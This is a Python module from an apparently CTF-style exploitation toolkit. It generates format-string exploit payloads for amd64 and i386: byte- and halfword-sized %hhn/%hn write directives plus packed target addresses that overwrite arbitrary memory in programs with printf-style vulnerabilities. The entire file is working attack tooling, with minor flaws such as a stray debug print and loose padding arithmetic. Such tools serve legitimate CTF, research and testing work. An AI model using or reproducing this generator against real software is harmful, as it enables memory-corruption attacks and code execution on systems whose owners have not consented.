from dn3.misc.encoding import p64, p32
from dn3.l1ght.context import ctx
from logging import getLogger

logger = getLogger(__name__)

def bytecalc(x,y):
    return (x-y) & 0xff


def dbytecalc(x,y):
    return (x-y) & 0xffff


def pad8(x,prefix_size=0):
    return x+"A"*(8-(len(x)%8)-prefix_size)


def pad4(x,prefix_size=0):
    return x+"A"*(4-(len(x)%4)-prefix_size)


class FmtStrGen():

    def __init__(self,arch=None):

        if arch == None:
            arch = ctx.arch
        
        self._arch = arch

    def gen(self,addresses,values,offset=1,already_printed=0,prefix_size=0,target_size=4096):

        if self._arch == "amd64":
            payload = fmtstr64(addresses,values,offset,already_printed,prefix_size)
            if len(payload) <= target_size:
                return payload
            payload = dfmtstr64(addresses,values,offset,already_printed,prefix_size)
            if len(payload) <= target_size:
                return payload
            else:
                logger.error("Couldn't fit target size")
            
        elif self._arch == "i386":
            payload = fmtstr32(addresses,values,offset,already_printed,prefix_size)
            if len(payload) <= target_size:
                return payload
            payload = dfmtstr32(addresses,values,offset,already_printed,prefix_size)
            print(payload)
            if len(payload) <= target_size:
                return payload
            else:
                logger.error("Couldn't fit targret size")

        else:
            logger.error("Architecture not supported!")


def fmtstr64(addresses,values,offset=1,already_printed=0,prefix_size=0):
    assert len(values) == len(addresses)

    offset += prefix_size//8
    prefix_size = prefix_size%8

    fmtstr_1 = ""
    fmtstr_2 = ""
    p_values = [hex(i).replace("0x","").rjust(16,"0") for i in values]
    f_values,f_addresses = [],[]

    for i in p_values:
        temp = [int("0x"+i[j:j+2],16) for j in range(0,len(i),2)]
        f_values.extend(temp[::-1])

    for i in addresses:
        f_addresses.extend([p64(j) for j in range(i,i+8)])

    for i in range(len(f_values)):
        if  f_values[i] != 0:
            n = bytecalc(f_values[i],already_printed)
            already_printed += n
            fmtstr_1 += f"%{n}c%XX$hhn"
            fmtstr_2 += f_addresses[i]
        else:
            continue

    fmtstr_1 = pad8(fmtstr_1,prefix_size)
    p = offset+len(fmtstr_1)//8
    
    while True:
        try:
            i = fmtstr_1.index("XX")
            fmtstr_1 = fmtstr_1[:i] + str(p).rjust(2,"0") + fmtstr_1[i+2:]
            p += 1
        except:
            break
    return fmtstr_1+fmtstr_2


def dfmtstr64(addresses,values,offset=1,already_printed=0,prefix_size=0):
    assert len(values) == len(addresses)

    offset += prefix_size//8
    prefix_size = prefix_size%8

    fmtstr_1 = ""
    fmtstr_2 = ""
    p_values = [hex(i).replace("0x","").rjust(16,"0") for i in values]
    f_values,f_addresses = [],[]

    for i in p_values:
        temp = [int("0x"+i[j:j+4],16) for j in range(0,len(i),4)]
        f_values.extend(temp[::-1])

    for i in addresses:
        f_addresses.extend([p64(j) for j in range(i,i+8,2)])

    for i in range(len(f_values)):
        if  f_values[i] != 0:
            n = dbytecalc(f_values[i],already_printed)
            already_printed += n
            fmtstr_1 += f"%{n}c%XX$hn"
            fmtstr_2 += f_addresses[i]
        else:
            continue

    fmtstr_1 = pad8(fmtstr_1,prefix_size)
    p = offset+len(fmtstr_1)//8
    
    while True:
        try:
            i = fmtstr_1.index("XX")
            fmtstr_1 = fmtstr_1[:i] + str(p).rjust(2,"0") + fmtstr_1[i+2:]
            p += 1
        except:
            break
    return fmtstr_1+fmtstr_2


def fmtstr32(addresses,values,offset=1,already_printed=0,prefix_size=0):
    assert len(values) == len(addresses)

    offset += prefix_size//4
    prefix_size = prefix_size%4

    fmtstr_1 = ""
    fmtstr_2 = ""
    p_values = [hex(i).replace("0x","").rjust(8,"0") for i in values]
    f_values,f_addresses = [],[]

    for i in p_values:
        temp = [int("0x"+i[j:j+2],16) for j in range(0,len(i),2)]
        f_values.extend(temp[::-1])

    for i in addresses:
        f_addresses.extend([p32(j) for j in range(i,i+4)])

    for i in range(len(f_values)):
        if  f_values[i] != 0:
            n = bytecalc(f_values[i],already_printed)
            already_printed += n
            fmtstr_1 += f"%{n}c%XX$hhn"
            fmtstr_2 += f_addresses[i]
        else:
            continue

    fmtstr_1 = pad4(fmtstr_1,prefix_size)
    p = offset+len(fmtstr_1)//4
    
    while True:
        try:
            i = fmtstr_1.index("XX")
            fmtstr_1 = fmtstr_1[:i] + str(p).rjust(2,"0") + fmtstr_1[i+2:]
            p += 1
        except:
            break
    return fmtstr_1+fmtstr_2


def dfmtstr32(addresses,values,offset=1,already_printed=0,prefix_size=0):
    assert len(values) == len(addresses)

    offset += prefix_size//4
    prefix_size = prefix_size%4

    fmtstr_1 = ""
    fmtstr_2 = ""
    p_values = [hex(i).replace("0x","").rjust(8,"0") for i in values]
    f_values,f_addresses = [],[]

    for i in p_values:
        temp = [int("0x"+i[j:j+4],16) for j in range(0,len(i),4)]
        f_values.extend(temp[::-1])

    for i in addresses:
        f_addresses.extend([p32(j) for j in range(i,i+4,2)])

    for i in range(len(f_values)):
        if  f_values[i] != 0:
            n = dbytecalc(f_values[i],already_printed)
            already_printed += n
            fmtstr_1 += f"%{n}c%XX$hn"
            fmtstr_2 += f_addresses[i]
        else:
            continue

    fmtstr_1 = pad4(fmtstr_1,prefix_size)
    p = offset+len(fmtstr_1)//4
    
    while True:
        try:
            i = fmtstr_1.index("XX")
            fmtstr_1 = fmtstr_1[:i] + str(p).rjust(2,"0") + fmtstr_1[i+2:]
            p += 1
        except:
            break
    return fmtstr_1+fmtstr_2